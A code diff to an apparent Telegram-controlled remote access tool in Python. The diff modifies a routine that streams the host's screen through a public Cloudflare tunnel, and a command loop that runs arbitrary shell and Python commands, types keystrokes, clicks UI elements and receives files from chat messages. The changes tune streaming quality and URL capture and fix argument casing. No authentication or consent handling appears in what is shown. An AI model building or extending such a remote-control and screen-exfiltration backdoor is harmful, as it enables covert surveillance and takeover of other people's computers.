@@ -184,37 +184,42 @@ def livestream(chat_id):
             def gen():
                 nonlocal last_frame
                 while True:
+                    # Windows specific screen grab via PIL is reliable
                     img = ImageGrab.grab()
                     frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
 
                     if last_frame is not None:
-                        # Only send diff if needed, but for MJPEG we typically send full frames.
-                        # Simple diff-based skipping to save bandwidth:
                         diff = cv2.absdiff(frame, last_frame)
-                        if np.mean(diff) < 1.0: # Very little change
+                        if np.mean(diff) < 0.5: # Extremely aggressive diff
                             time.sleep(0.1); continue
 
                     last_frame = frame.copy()
-                    _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
+                    _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 40])
                     yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')
                     time.sleep(0.1)
 
             @app.route("/")
             def index(): return Response(gen(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
-            # Start Cloudflared
+            # Start Cloudflared and capture output
+            send_message(chat_id, "Starting Cloudflare tunnel...")
             cf_proc = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
 
-            # Extract URL from cloudflared output
             url = None
             start_time = time.time()
-            while time.time() - start_time < 30:
+            # Loop to read output until URL is found or timeout
+            while time.time() - start_time < 60:
                 line = cf_proc.stdout.readline()
+                if not line: break
                 if "trycloudflare.com" in line:
-                    url = line.strip().split(" ")[-1]; break
+                    parts = line.strip().split(" ")
+                    for p in parts:
+                        if "trycloudflare.com" in p:
+                            url = p; break
+                    if url: break
 
-            if url: send_message(chat_id, f"LiveStream started: {url}")
-            else: send_message(chat_id, "Failed to start Cloudflare tunnel.")
+            if url: send_message(chat_id, f"LiveStream online: {url}")
+            else: send_message(chat_id, "Failed to capture Cloudflare URL. Please check if cloudflared is installed.")
 
             app.run(host="0.0.0.0", port=5000, threaded=True)
         except Exception as e: send_message(chat_id, f"LiveStream Error: {e}")
@@ -241,8 +246,10 @@ while True:
             if "document" in msg: download_file(chat_id, msg["document"]["file_id"], msg["document"].get("file_name", "file")); continue
             elif "photo" in msg: download_file(chat_id, msg["photo"][-1]["file_id"], f"photo_{int(time.time())}.jpg"); continue
 
-            text = (msg.get("text") or "").strip().lower()
+            orig_text = (msg.get("text") or "").strip()
+            text = orig_text.lower()
             if not text: continue
+
             if text in ("/start", "/help"): send_message(chat_id, WELCOME); continue
             if text == "/stop": sys.exit(0)
             if text == "screen": take_screenshot(chat_id); continue
@@ -254,13 +261,13 @@ while True:
 
             if text == "opened apps": ui_automation(chat_id, "opened_apps"); continue
             if text == "apps": ui_automation(chat_id, "available_apps", "list"); continue
-            if text.startswith("open "): ui_automation(chat_id, "available_apps", text[5:].strip()); continue
+            if text.startswith("open "): ui_automation(chat_id, "available_apps", orig_text[5:].strip()); continue
             if text == "buttons": ui_automation(chat_id, "list_buttons"); continue
-            if text.startswith("click "): ui_automation(chat_id, "click", text[6:].strip()); continue
-            if text.startswith("double click "): ui_automation(chat_id, "double_click", text[13:].strip()); continue
-            if text.startswith("press "): ui_automation(chat_id, "press", text[6:].strip()); continue
-            if text.startswith("type "): ui_automation(chat_id, "type", text[5:].strip()); continue
+            if text.startswith("click "): ui_automation(chat_id, "click", orig_text[6:].strip()); continue
+            if text.startswith("double click "): ui_automation(chat_id, "double_click", orig_text[13:].strip()); continue
+            if text.startswith("press "): ui_automation(chat_id, "press", orig_text[6:].strip()); continue
+            if text.startswith("type "): ui_automation(chat_id, "type", orig_text[5:].strip()); continue
 
             is_shell = text.startswith("/") or any(text.startswith(x) for x in ["pip ", "npm ", "git ", "python "])
-            run_command(chat_id, text[1:].strip() if text.startswith("/") else text, is_python=not is_shell)
+            run_command(chat_id, orig_text[1:].strip() if text.startswith("/") else orig_text, is_python=not is_shell)
     except Exception as e: print(f"Error: {e}"); time.sleep(5)
